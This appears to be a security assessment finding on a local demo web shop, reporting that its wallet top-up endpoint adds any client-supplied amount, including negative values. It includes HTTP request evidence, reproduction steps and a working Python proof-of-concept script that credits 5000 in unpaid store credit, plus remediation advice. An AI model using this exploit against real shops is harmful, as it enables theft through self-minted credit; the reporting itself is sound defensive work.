# Wallet top-up accepts arbitrary and negative deposit amounts (unlimited store credit)

**ID:** vuln-0018
**Severity:** MEDIUM
**Found:** 2026-09-11 20:02:11 UTC
**Target:** http://host.docker.internal:3001
**Method:** PUT
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The wallet top-up endpoint PUT /rest/wallet/balance treats the client-supplied "balance" field as a deposit amount and adds it to the current balance with no validation. A customer can supply an arbitrary positive amount (unlimited store credit with no real charge) or a negative amount, driving the wallet balance below zero.

## Evidence

Request/response sequence (wallet initially 0):

```http
PUT /rest/wallet/balance
Authorization: Bearer <customer JWT>
{"balance": 50, "paymentId": 8}
-> 200 {"status":"success","data":50}
GET /rest/wallet/balance -> {"status":"success","data":51}   (50 added to 1)
```

```http
PUT /rest/wallet/balance {"balance": -100, "paymentId": 8}
-> 200 {"status":"success","data":-100}
GET -> -49   (negative amount added, balance driven below zero)
```

```http
PUT /rest/wallet/balance {"balance": 5000, "paymentId": 8}
-> 200 {"status":"success","data":5000}
GET -> 4951  (arbitrary 5000 credited with no real charge)
```

## Impact

Any authenticated customer can grant themselves unlimited store credit (observed: 5000 credited with no charge to any funding source) and can drive their wallet balance arbitrarily negative. In a real deployment this is direct financial loss: the attacker orders merchandise against self-minted balance. The negative-balance direction also enables further negative-total/wallet interplay.

## Counterevidence

Checked whether deposits were validated server-side: positive deposits are always ADDED (PUT 50 -> 51, PUT 5000 -> 4951 from prior balances), proving the handler adds rather than sets, and it accepts negative values with no floor at zero. The 402 "Payment not accepted" path only triggers on missing/invalid paymentId, i.e. the guard validates card ownership, not amount. No WAF or amount validation rejected any request. The arbitrary positive top-up was verified three times with amounts (50, 5000) never charged to any real funding source.

## What Would Change This Severity

Confirmation that a real payment provider integration exists and charges the card would lower severity of the positive top-up leg; none is present in this deployment.

## Technical Analysis

PUT /rest/wallet/balance accepts {"balance": <number>, "paymentId": <card id>}. The handler resolves the saved card by id (rejecting unknown ids with 402 "Payment not accepted") but performs no validation on the amount: the supplied "balance" value is added to the current wallet balance. Positive values mint store credit with no corresponding real charge (the app has no payment provider — any well-formed saved card "succeeds"), and negative values are added as-is, allowing the balance to go below zero (observed -100, then -49 after a subsequent +51 order). The endpoint therefore lets any authenticated customer set an effectively arbitrary credit position.

## Proof of Concept

1. Register/login as any customer and save a payment card via POST /api/Cards (e.g. cardNum 4111111111111111, expMonth 1, expYear 2087).
2. GET /rest/wallet/balance to record the starting balance.
3. PUT /rest/wallet/balance with {"balance": 5000, "paymentId": <card id>} — responds 200 with data 5000.
4. GET /rest/wallet/balance shows the starting balance PLUS 5000.
5. Repeat with {"balance": -100, "paymentId": <card id>} — balance goes negative; no payment is ever actually processed.

```python
import json
import requests

BASE = "http://host.docker.internal:3001"
TOKEN = open("/workspace/recon_token.txt").read().strip()  # any customer JWT
H = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
P = {"http": None, "https": None}

# saved card (one-time): POST /api/Cards {"fullName":"X","cardNum":"4111111111111111","expMonth":1,"expYear":2087}
CARD_ID = 8

def wallet():
    return requests.get(f"{BASE}/rest/wallet/balance", headers=H, proxies=P).json()["data"]

print("before:", wallet())
r = requests.put(f"{BASE}/rest/wallet/balance", headers=H,
                 data=json.dumps({"balance": 5000, "paymentId": CARD_ID}), proxies=P)
print("PUT 5000:", r.status_code, r.text)
print("after:", wallet(), "(arbitrary credit, nothing charged)")

r = requests.put(f"{BASE}/rest/wallet/balance", headers=H,
                 data=json.dumps({"balance": -100, "paymentId": CARD_ID}), proxies=P)
print("PUT -100:", r.status_code, r.text)
print("after negative deposit:", wallet(), "(balance below zero)")
```

## Remediation

Validate the deposit amount server-side at PUT /rest/wallet/balance: require a positive value, and enforce sane per-transaction and cumulative deposit limits. Do not trust the client-supplied "balance"/amount field as the deposit amount at all — derive the credited amount from a server-side payment-provider confirmation. Reject negative amounts explicitly before mutating the wallet.

## Assumptions

Authenticated customer with any registered payment card; demo application with seeded data, so impact is scored on the demonstrated consequence class (monetary integrity violation), not real-user harm.
